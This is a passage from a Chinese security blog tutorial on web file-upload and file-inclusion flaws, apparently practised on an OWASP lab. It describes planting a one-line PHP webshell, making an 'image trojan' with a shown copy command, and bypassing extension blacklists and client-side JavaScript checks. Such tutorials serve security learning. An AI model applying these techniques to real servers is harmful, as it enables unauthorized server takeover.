<p>所以我做了一张图来描述这一句话木马在黑入服务器后，我们利用他来进行的一系列操作：</p>
<p>1、我们首先将图片木马放进一个文件里面，上传到服务器</p>
<p>2、我们利用上面的方法，在网页访问图片的时候，服务器就会自动解析图片里面嵌入的‘图片木马’</p>
<p>3、图片木马被PHP语言成功解析之后，就在服务器的根目录下面生成了一个一句话木马</p>
<p>4、我们找到一句话木马所在的路径，然后重复我们上面的步骤就可以，利用我们的一句话木马</p>
<img src="https://raw.githubusercontent.com/Chozimer/picture/main/Web文件包含上传漏洞/图片木马构造之fpiuts函数.png" alt="avater" style="zoom:67%;" />

<h4 id="制作图片木马："><a href="#制作图片木马：" class="headerlink" title="制作图片木马："></a>制作图片木马：</h4><p>1、首先准备好，我们的图片和图片木马</p>
<p>2、打开CMD终端使用copy test.png/b + hacker.php/a hacker.png制作图片木马</p>
<p>(Ps：copy语句中b指二进制文件，a指ascii码文件)</p>
<h4 id="实际渗透操作：-1"><a href="#实际渗透操作：-1" class="headerlink" title="实际渗透操作："></a>实际渗透操作：</h4><h3 id="额外：后缀名绕过"><a href="#额外：后缀名绕过" class="headerlink" title="额外：后缀名绕过"></a>额外：后缀名绕过</h3><p>文件后缀绕过攻击是服务端代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其他文件后缀的，例如在httpd.conf中，如果配置有如下代码，我们可以查看其使用的解析模组，并在解析模组中查看可以解析成PHP运行的文件后缀名称，则能够解析php和phtml文件。</p>
<h4 id="网页源码分析："><a href="#网页源码分析：" class="headerlink" title="网页源码分析："></a>网页源码分析：</h4><p>我们可以看到，在网页后端中进行用黑名单限制了我们的上传php等类型的一句话木马，但是并没有进行限制我们的php3等phphtml文件等上传所以我们可以进行将我们的一句木马进行上传然后进行利用</p>
<h3 id="额外：删除Javascript验证"><a href="#额外：删除Javascript验证" class="headerlink" title="额外：删除Javascript验证"></a>额外：删除Javascript验证</h3><p>JS检测绕过上传漏洞常见于用户选择文件上传的场景，如果上传文件的后缀不被允许，则会弹框告知，此时上传文件的数据包并没有发送到服务端，只是在客户端浏览器使用JavaScript对数据包进行检测。</p>
<p>由于检查实在客户端的网页，这时有两种方法可以绕过客户端JavaScript的检测。<br>1、使用浏览器的插件，删除检测文件后缀的JS代码，然后上传文件即可绕过。</p>
<p>2、首先把需要上传文件的后缀改成允许上传的，如jpg、png等，绕过JS的检测，再抓包，把后缀名改成可执行文件的后缀即可上传成功。</p>
<h4 id="网页源代码分析：-1"><a href="#网页源代码分析：-1" class="headerlink" title="网页源代码分析："></a>网页源代码分析：</h4><p>客户端上传文件的HTML代码如下所示,在选择文件时，会调用JS的selectFile函数，函数的作用是先将文件名转换为小写，然后通过substr获取文件名最后一个点号后面的后缀(包括点号)。如果后缀不是“jpg”，则会弹框提示“请选择jpg格式的照片上传”。</p>
<p>服务端处理上传文件的代码如下所示。如果上传文件没出错,再通过file_exists判断在upload目录下文件是否已存在，不存在的话就通过move_uploaded_file将文件保存到upload目录。此PHP代码中没有对文件后缀做任何判断，所以只需要绕过前端JS的校验就可以上传WebShell。</p>
<h4 id="挖洞实战"><a href="#挖洞实战" class="headerlink" title="挖洞实战"></a>挖洞实战</h4></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Chozimer</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://chozimer.github.io/2021/04/21/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">https://chozimer.github.io/2021/04/21/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Chozimer.github.io" target="_blank">秋子熙驿站</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/04/21/%E6%B5%8B%E8%AF%95%E5%8D%9A%E5%AE%A2/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">测试博客</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Chozimer</div><div class="author-info__description">一个收藏回忆与分享技术的地方！</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E5%85%A5%E9%97%A8%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">Web文件包含上传入门：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">2.1.</span> <span class="toc-text">文件上传漏洞是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%AD%E5%BB%BAOWASP%E9%9D%B6%E5%9C%BA"><span class="toc-number">2.2.</span> <span class="toc-text">搭建OWASP靶场</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.3.</span> <span class="toc-text">简单的上传一句话木马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.3.1.</span> <span class="toc-text">网页源码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%9E%84%E9%80%A0"><span class="toc-number">2.3.2.</span> <span class="toc-text">一句话木马构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.3.3.</span> <span class="toc-text">一句话木马的各种类型</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E8%BF%9B%E9%98%B6%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">Web文件包含上传进阶：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">3.0.1.</span> <span class="toc-text">网页源代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C%EF%BC%9A"><span class="toc-number">3.0.2.</span> <span class="toc-text">实际渗透操作：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E9%AB%98%E9%98%B6%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">Web文件包含上传高阶：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">4.0.1.</span> <span class="toc-text">网页源代码分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E6%9E%84%E9%80%A0%E8%A7%A3%E6%9E%90%EF%BC%9A"><span class="toc-number">4.0.2.</span> <span class="toc-text">图片木马构造解析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%EF%BC%9A"><span class="toc-number">4.0.3.</span> <span class="toc-text">制作图片木马：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C%EF%BC%9A-1"><span class="toc-number">4.0.4.</span> <span class="toc-text">实际渗透操作：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%9D%E5%A4%96%EF%BC%9A%E5%90%8E%E7%BC%80%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-number">4.1.</span> <span class="toc-text">额外：后缀名绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">4.1.1.</span> <span class="toc-text">网页源码分析：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%9D%E5%A4%96%EF%BC%9A%E5%88%A0%E9%99%A4Javascript%E9%AA%8C%E8%AF%81"><span class="toc-number">4.2.</span> <span class="toc-text">额外：删除Javascript验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">网页源代码分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98"><span class="toc-number">4.2.2.</span> <span class="toc-text">挖洞实战</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/04/21/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="Web文件包含上传漏洞"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web文件包含上传漏洞"/></a><div class="content"><a class="title" href="/2021/04/21/Web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="Web文件包含上传漏洞">Web文件包含上传漏洞</a><time datetime="2021-04-21T10:42:49.000Z" title="发表于 2021-04-21 18:42:49">2021-04-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/21/%E6%B5%8B%E8%AF%95%E5%8D%9A%E5%AE%A2/" title="测试博客"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="测试博客"/></a><div class="content"><a class="title" href="/2021/04/21/%E6%B5%8B%E8%AF%95%E5%8D%9A%E5%AE%A2/" title="测试博客">测试博客</a><time datetime="2021-04-21T10:34:20.000Z" title="发表于 2021-04-21 18:34:20">2021-04-21</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2021/04/20/hello-world/" title="Hello World">Hello World</a><time datetime="2021-04-20T11:16:26.343Z" title="发表于 2021-04-20 19:16:26">2021-04-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Chozimer</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>